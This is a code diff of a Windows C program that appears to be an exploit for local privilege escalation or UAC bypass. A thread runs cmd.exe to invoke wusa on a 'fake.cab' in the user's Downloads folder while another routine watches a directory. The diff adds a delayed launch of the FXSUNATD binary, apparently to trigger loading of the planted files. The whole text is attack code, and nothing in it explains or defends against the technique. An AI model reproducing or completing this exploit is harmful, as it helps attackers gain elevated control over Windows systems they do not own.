@@ -43,9 +43,10 @@ void WatchDirectory()
 
 DWORD WINAPI Thread1(LPVOID lpParam)
 {
-
+	
 	Sleep(100);
 	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k wusa c:\\users\\%username%\\downloads\\fake.cab", 5);
+
 	return 0;
 }
 
@@ -54,6 +55,8 @@ int _tmain()
 	CreateThread(NULL,0,Thread1,NULL,0,NULL);  
 
 	WatchDirectory();
+	Sleep(5000);
+	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k 	FXSUNATD", 5);
 	return 0;
 }
 
